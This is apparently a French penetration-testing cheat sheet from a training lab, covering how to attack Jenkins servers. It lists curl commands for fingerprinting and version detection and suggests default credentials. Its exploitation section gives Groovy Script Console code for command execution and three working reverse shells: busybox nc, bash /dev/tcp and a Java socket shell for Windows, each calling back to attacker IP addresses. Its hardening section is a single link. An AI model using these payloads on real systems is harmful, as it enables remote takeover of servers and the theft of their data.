 
- [ ] [[#ENUMERATION MANUELLE]]
- [ ] [[#EXPLOITATION]]
- [ ] [[#HARDENING]]


Port 8080 par défaut / 5000 pour les serveurs esclaves


# ENUMERATION MANUELLE

- [ ] [[#Identifier Jenkins / page de login]]
- [ ] [[#Tester default creds]]

## Identifier Jenkins / page de login

```bash
curl -s http://jenkins.inlanefreight.local:8000/login?from=%2F | grep Jenkins
```

## Identifier la version

```sh
curl -s http://172.16.1.19:8080/oops | grep data-version
```

## Tester default creds

admin:admin ...


---
# EXPLOITATION

- [[#Script Console]]
- [[#CVEs]]


## Script Console

http://jenkins.inlanefreight.local:8000/script

Permet d'exécuter Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) scripts.

#### RCE

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

#### Reverse Shell

```Groovy
def cmd = 'busybox nc 10.10.14.63 443 -e /bin/bash'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(100000)
println sout
```

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```


Windows

```groovy
String host="10.10.14.63";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## CVEs

[CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266)

https://github.com/gquere/pwn_jenkins








---

# HARDENING

https://www.jenkins.io/doc/book/security/securing-jenkins/